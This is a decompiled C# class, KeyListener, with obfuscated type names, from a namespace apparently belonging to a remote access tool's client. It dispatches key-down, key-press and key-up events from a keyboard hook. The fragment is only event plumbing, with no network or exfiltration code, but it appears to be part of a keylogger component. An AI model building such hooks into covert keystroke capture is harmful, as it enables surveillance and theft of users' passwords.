using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class KeyListener : BaseListener, GInterface0
{
	[CompilerGenerated]
	private KeyEventHandler KeyDown;

	[CompilerGenerated]
	private KeyPressEventHandler KeyPress;

	[CompilerGenerated]
	private KeyEventHandler KeyUp;

	public event KeyEventHandler Event_0
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = KeyDown;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Combine((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyDown, value2, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = KeyDown;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Remove((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyDown, value2, val2);
			}
			while (val != val2);
		}
	}

	public event KeyPressEventHandler Event_1
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyPressEventHandler val = KeyPress;
			KeyPressEventHandler val2;
			do
			{
				val2 = val;
				KeyPressEventHandler value2 = (KeyPressEventHandler)Delegate.Combine((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyPress, value2, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyPressEventHandler val = KeyPress;
			KeyPressEventHandler val2;
			do
			{
				val2 = val;
				KeyPressEventHandler value2 = (KeyPressEventHandler)Delegate.Remove((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyPress, value2, val2);
			}
			while (val != val2);
		}
	}

	public event KeyEventHandler Event_2
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = KeyUp;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Combine((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyUp, value2, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			KeyEventHandler val = KeyUp;
			KeyEventHandler val2;
			do
			{
				val2 = val;
				KeyEventHandler value2 = (KeyEventHandler)Delegate.Remove((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref KeyUp, value2, val2);
			}
			while (val != val2);
		}
	}

	protected KeyListener(Delegate1 subscribe)
		: base(subscribe)
	{
	}

	public void InvokeKeyDown(GEventArgs0 e)
	{
		KeyEventHandler keyDown = KeyDown;
		if (keyDown != null && !((KeyEventArgs)e).get_Handled() && e.IsKeyDown)
		{
			keyDown.Invoke((object)this, (KeyEventArgs)(object)e);
		}
	}

	public void InvokeKeyPress(GEventArgs1 e)
	{
		KeyPressEventHandler keyPress = KeyPress;
		if (keyPress != null && !((KeyPressEventArgs)e).get_Handled() && !e.IsNonChar)
		{
			keyPress.Invoke((object)this, (KeyPressEventArgs)(object)e);
		}
	}

	public void InvokeKeyUp(GEventArgs0 e)
	{
		KeyEventHandler keyUp = KeyUp;
		if (keyUp != null && !((KeyEventArgs)e).get_Handled() && e.IsKeyUp)
		{
			keyUp.Invoke((object)this, (KeyEventArgs)(object)e);
		}
	}

	protected override bool Callback(Struct1 data)
	{
		GEventArgs0 downUpEventArgs = GetDownUpEventArgs(data);
		IEnumerable<GEventArgs1> pressEventArgs = GetPressEventArgs(data);
		InvokeKeyDown(downUpEventArgs);
		foreach (GEventArgs1 item in pressEventArgs)
		{
			InvokeKeyPress(item);
		}
		InvokeKeyUp(downUpEventArgs);
		return !((KeyEventArgs)downUpEventArgs).get_Handled();
	}

	protected abstract IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data);

	protected abstract GEventArgs0 GetDownUpEventArgs(Struct1 data);
}
